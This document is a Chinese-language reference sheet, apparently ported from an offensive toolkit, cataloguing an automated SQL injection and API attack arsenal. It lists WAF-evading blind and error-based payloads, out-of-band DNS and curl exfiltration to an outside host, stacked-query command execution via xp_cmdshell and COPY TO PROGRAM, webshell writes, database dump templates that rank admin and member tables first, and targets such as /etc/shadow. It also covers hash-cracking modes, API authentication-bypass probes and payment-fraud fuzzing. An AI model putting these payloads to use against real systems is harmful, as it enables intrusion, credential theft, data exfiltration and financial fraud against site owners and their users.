# SQLi Advanced / DB Dump / API Arsenal — 从 bingo v7.0.66 移植 (sqli_auto.py + advanced_sqli.py + sqli_advanced.py + db_dumper.py + api_*.py + bizlogic_fuzzer.py)

## 1. 数据库类型自动检测 (detect_db_type)

```
mssql:  "microsoft.*ole db.*sql server", "unclosed quotation mark", "incorrect syntax near",
        "80040e14", "sql server.*native client", "adodb.command", "waitfor delay"
mysql:  "you have an error in your sql syntax", "mysql_fetch_array", "1064.*sql syntax",
        "table.*doesn.t exist", "unknown column", "extractvalue(", "updatexml("
postgresql: "pg_query", "pg_exec", "postgreSQL.*ERROR", "unterminated quoted string", "pg_sleep"
oracle: "ORA-\d{5}", "quoted string not properly terminated", "xmltype(", "dbms_pipe"
sqlite: "sqlite_.*error", "sqlite3."
supports_stacked: mssql/postgresql
```

## 2. DB 专用错误载荷 (error-based)

```sql
mssql:  ' AND 1=CONVERT(int,(SELECT TOP 1 name FROM master..sysdatabases))--
mysql:  ' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database() LIMIT 1)))--
mysql:  ' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT database()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
mysql:  ' AND EXP(~(SELECT * FROM (SELECT database()) x))--
pg:     ' AND 1=CAST((SELECT version()) AS int)--   /   '; SELECT 1/0--
oracle: ' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE ROWNUM=1))--
提取:   EXTRACTVALUE 错误正则 r"XPATH syntax error.*?'~([^'<]{1,200})'"
```

## 3. Time-based heavy query 替换 (SLEEP 被拦)

```sql
(SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.columns C)
BENCHMARK(50000000,MD5(1))
GET_LOCK(0x61,5)
SLEEP/***/(5)  |  /*!SLEEP*/(5)  |  SLEEP%09(5)
pg_sleep(5)
WAITFOR DELAY '0:0:5'   (MSSQL)
(SELECT count(*) FROM sysusers sys1, sysusers sys2, sysusers sys3, sysusers sys4)  (MSSQL heavy)
(SELECT count(*) FROM sqlite_master t1, sqlite_master t2, sqlite_master t3)  (SQLite)
```

## 4. OOB DNS 载荷 (4种)

```sql
mysql_load_file:  ' AND LOAD_FILE(CONCAT(0x5c5c5c5c,({expr}),0x2e,0x<dn-hex>,0x5c5c61))-- -
mysql_select_dns: ' AND (SELECT ({expr}) INTO OUTFILE '\\{dn}\a')-- -
mssql_xp_dirtree: '; EXEC master..xp_dirtree '\\'+({expr})+'.'+'{dn}'+'\a'-- -
oracle_utl_http:  ' OR 1=(SELECT UTL_HTTP.REQUEST('http://'||({expr})||'.{dn}') FROM DUAL)-- -
pg (最狠):        ; COPY (SELECT ({expr})) TO PROGRAM 'curl http://{dn}/?x='||({expr})||''--
```

## 5. 盲注字符提取降级链

```
① SUBSTRING(expr,pos,1)='a'  → 被拦:
② RIGHT(REVERSE((expr)),99999-pos+1) LIKE REVERSE('c%')
③ LOCATE('c',(expr),pos)=pos
④ BETWEEN 二分: SUBSTR(expr,pos,1)>=0x4d (ORD/ASCII 被拦时)
⑤ LIKE hex 前缀: expr LIKE 0x<prefix+c+"%"> (无函数名,最抗WAF)
策略 A→E 每策略连续3次 UNKNOWN 即标记 blocked
```

## 6. UNKNOWN 三态布尔提取 (bool_oracle_extract 核心)

```
三态: true / false / unknown
unknown 判定: RemoteDisconnected / EOF / timeout / WAF silent drop → 不进二分
基线校准: true_indicator 字符串 或 size_diff≥20B(强) 5-19B(弱)
全位置 UNKNOWN >60% 或连续3位置失败 → 提前退出给转场建议
```

## 7. 6阶段自动 SQLi exploit 链

```
STAGE1: 8组 boolean oracle 对 (' && '1'='1 / '/**/AND/**/1=1-- / ' AND%0a1=1-- / ({base})&&(1=1))
        sanity: 1=1→True, 1=2→False 验证, BAD 则禁用 boolean
STAGE2: SUBSTRING/MID/HEX 常量测试 + DB函数被WAF拦截检测
        关键防误报: SUBSTRING(DATABASE(),1,99)='@@@IMPOSSIBLE_STRING@@@' 返回 True = WAF 拦DB函数
STAGE2.5: error-based 三重防误报 (见 01-waf-bypass-master §11)
STAGE2.6: time-based 3次基线平均 + 1.5s阈值, FALSE 也用 SLEEP(0) 验证可靠性
STAGE3: DB info, error→boolean→time 优先级; FROM 绕过: ["FROM","FR/**/OM","FR%0aOM","FR\x00OM","F%52OM"]
        sanity: version/db/user 三个相同 = 页面内容误报 → 禁用 error-based
STAGE4-6: information_schema.tables 5变体(含反引号、schema/**/.tables) → 表名 LIMIT i,1
        兴趣表: member users admin account tb_member xe_member 회원...
        优先级列: id username userid email password passwd mb_id mb_password
```

## 8. 数据库转储 5 方言 SQL 模板 (db_dumper.py)

```sql
-- MySQL
list_tables:  SELECT table_name FROM information_schema.tables WHERE table_schema=database()
list_columns: SELECT column_name FROM information_schema.columns WHERE table_name='{t}' AND table_schema=database()
dump_table:   SELECT * FROM `{t}` LIMIT {n} OFFSET {o}
-- MSSQL (OFFSET 技巧)
dump_table:   SELECT * FROM [{t}] ORDER BY (SELECT NULL) OFFSET {o} ROWS FETCH NEXT {n} ROWS ONLY
-- PostgreSQL
dump_table:   SELECT * FROM "{t}" LIMIT {n} OFFSET {o}
-- SQLite
list_tables:  SELECT name FROM sqlite_master WHERE type='table'
dump_table:   SELECT * FROM [{t}] LIMIT {n} OFFSET {o}
-- Oracle (无 OFFSET, 只能 ROWNUM)
dump_table:   SELECT * FROM {t} WHERE ROWNUM <= {n}
```

### GROUP_CONCAT 分页 UNION dump (核心)
```sql
' UNION SELECT NULL,NULL,...-- -
-- 目标列替换为:
(SELECT GROUP_CONCAT({col} SEPARATOR '|||') FROM (SELECT {col} FROM {table} LIMIT 50 OFFSET {offset}) x)
-- 解析: re.findall(r"([^\|]+)\|\|\|", resp)
```

### 表分类优先级
```
admin(100): admin admins administrator manager staff operator superuser sys_user g5_admin xe_admin g5_config 관리자 운영자
member(90): member members mb_ user users account customer client person subscriber profile 회원 사용자 고객 g5_member xe_member wr_member
sensitive(50): payment card credit billing order transaction log session token secret key password config address phone email ssn passport identity 주문 결제 카드 배송
```

### WebShell 一键 dump
```
mysql:  mysqldump -u{u} -p{p} {db} {t} --single-transaction --quick | head -10000
mssql:  sqlcmd -S localhost -U {u} -P {p} -Q "SELECT * FROM {t}" -o /tmp/dump.csv -h-1 -s, -w 700
pg:     PGPASSWORD={p} psql -U {u} -d {db} -c "COPY {t} TO STDOUT CSV HEADER"
sqlite: sqlite3 /var/db/data.sqlite .dump {t}
```

## 9. Stacked Query → RCE

```sql
mssql xp_cmdshell: ; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE; EXEC xp_cmdshell '{cmd}'--
mssql OLE:         ; DECLARE @shell INT; EXEC sp_oacreate 'wscript.shell',@shell output; EXEC sp_oamethod @shell,'run',null,'{cmd}'--
pg:                ; COPY (SELECT '') TO PROGRAM '{cmd}'--
mysql outfile:     '; SELECT '<php eval>' INTO OUTFILE '{7种webroot路径}'--
```

## 10. 读文件目标 (FileSystemEngine)

```
linux: /etc/passwd /etc/shadow /proc/self/environ /proc/self/cmdline
       /var/www/html/wp-config.php application/config/database.php (CodeIgniter)
       config.php (GnuBoard) /var/log/apache2/access.log
windows: C:\windows\system32\drivers\etc\hosts web.config .env
```

## 11. MySQL 版本→CVE 映射 (SQLi 产物自动提权)

```
<5.7 → CVE-2012-2122 (auth bypass) | 5.6<45 → CVE-2019-2725 | 8.0<28 → CVE-2022-21417
```

## 12. Hash 识别 18 正则 → hashcat mode

```
bcrypt ^\$2[yba]\$\d{2}\$.{53}$ → 3200
md5crypt ^\$1\$ → 500 | sha512crypt ^\$6\$ → 1800
mysql41 ^\*[0-9A-F]{40}$ → 300 | mysql_old 16位hex → 自实现
32hex: 全大写→NTLM(1000), 小写→MD5(0)
40hex→SHA1(100) | 64hex→SHA256(1400) | 128hex→SHA512(1700)
LDAP {SHA} → 101 | SHA384 → 10800
```

## 13. API 武器组

### 13.1 API fuzz payload
```
1 2 0 -1 99999 admin ' " 1'-- "1 OR 1=1" ../etc/passwd ../../etc/passwd
<script>alert(1)</script> {{7*7}} ${7*7}   (IDOR+SQLi+穿越+SSTI 一网打尽)
敏感判定: password passwd secret token api_key private_key access_token ssn
          credit_card email phone 주민등록번호 계좌번호 비밀번호 root: /etc/passwd
          syntax error mysql ORA- pg_query traceback stack trace
```

### 13.2 API 版本路径 31 条
```
/v1 /v2 /v3 /v4 /v5 /v6 /api/v1 /api/v2 /api/v3 /api/v4 /api/v1.0 /api/v1.1
/api/v2.0 /api/v3.0 /api/1.0 /api/2.0 /api-v1 /api-v2 /api-v3 /rest/v1 /rest/v2
/service/v1 /service/v2 /app/ /mobile/ /internal/v1 /internal/v2 /private/v1
/public/v1 /beta /alpha /stable /dev /staging /prod
auth-stripping: 去掉 Authorization/x-api-key/Cookie 再请求, 200+len>100 = 认证绕过
```

### 13.3 API 发现路径 44 条
```
swagger.json /swagger-ui.html /swagger/index.html /api-docs /v2/api-docs
/v3/api-docs /openapi.json /openapi.yaml /.well-known/openapi.json
/$discovery/rest (Google) /graphql /graphiql /?wsdl /api/raml
/actuator/mappings (Spring Boot) /wp-json
```

### 13.4 动态捕获路径模板化
```
/\d{1,12}/ → /{id}/  |  UUID → {uuid}  |  24-64位hex → {hash}
去重键: METHOD:template
200+json = UNAUTH 标记
```

## 14. 业务逻辑 fuzzer (bizlogic_fuzzer.py)

```
负金额/溢出: -1 -0.01 -9999 0 0.001 2147483647 2147483648 -2147483649 9999999999 0.0000001
  判定: 200/201/302 + success|complete|order_id|주문|완료|결제 → CRITICAL (退款漏洞)
工作流跳过: 直 GET /checkout/confirm /order/complete /payment/success /checkout/step3
  /order/final /buy/confirm /purchase/done → 200+order|confirm|receipt|주문완료 → HIGH
优惠券滥用: ADMIN TEST FREE DISCOUNT100 SAVE100 0 NULL NONE UNDEFINED ' OR '1'='1 ../
  判定: discount|applied|valid|할인|적용 → HIGH
数量操纵: 0 -1 99999 1.5 1e10 NaN Infinity (异于基线即信号)
价格操纵: price∈{0,-1,0.01,"0","free"}, qty∈{-1,9999999}, 2**31溢出
```

## 15. 二次注入检测 (SECOND_ORDER_INDICATORS)

```
12词: reminder notification schedule background job email send export report queue batch cron task async
流程: 抓首页HTML检测异步执行面 → store payload → 触发异步 → 测时差
```

## 16. sqlmap level/risk 复刻 (SqliLevelRisk)

```
level 2+ → 测 Cookie | 3+ → Referer/UA | 4+ → XFF/X-Real-IP/X-Originating-IP | 5+ → Host/Accept
risk 2+ → OR 载荷 | 3+ → DROP/TRUNCATE/UPDATE
延迟: {1:5, 2:5, 3:7, 4:10, 5:15}s | 每参数载荷上限: {10,20,40,80,160}
```
